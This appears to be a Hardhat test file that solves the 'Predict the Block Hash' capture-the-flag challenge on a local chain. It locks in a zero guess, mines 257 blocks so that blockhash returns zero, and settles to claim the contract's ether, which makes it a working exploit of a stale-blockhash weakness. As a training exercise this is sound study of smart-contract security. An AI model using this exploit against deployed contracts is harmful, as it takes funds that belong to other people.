import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Contract } from 'ethers';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', function () {
  let challengeContract: Contract;

  before(async function () {
    const challengeFactory = await ethers.getContractFactory('PredictTheBlockHashChallenge');
    challengeContract = await challengeFactory.deploy({ value: utils.parseEther('1') });
    await challengeContract.deployed();
  });

  it('Solves the challenge', async function () {
    // Lock in the zero hash guess
    const lockInGuessTx = await challengeContract.lockInGuess(
      '0x0000000000000000000000000000000000000000000000000000000000000000',
      { value: utils.parseEther('1') }
    );
    await lockInGuessTx.wait();

    // Mine 257 blocks to ensure that the blockhash function will return zero
    // We wait for 257 blocks because we need to be past the 256 block threshold
    for (let i = 0; i < 257; i++) {
      await ethers.provider.send('evm_mine', []);
    }

    // Settle the challenge
    const attackTx = await challengeContract.settle();
    await attackTx.wait();

    // Check if the challenge is complete
    expect(await challengeContract.isComplete()).to.be.true;
  });
});
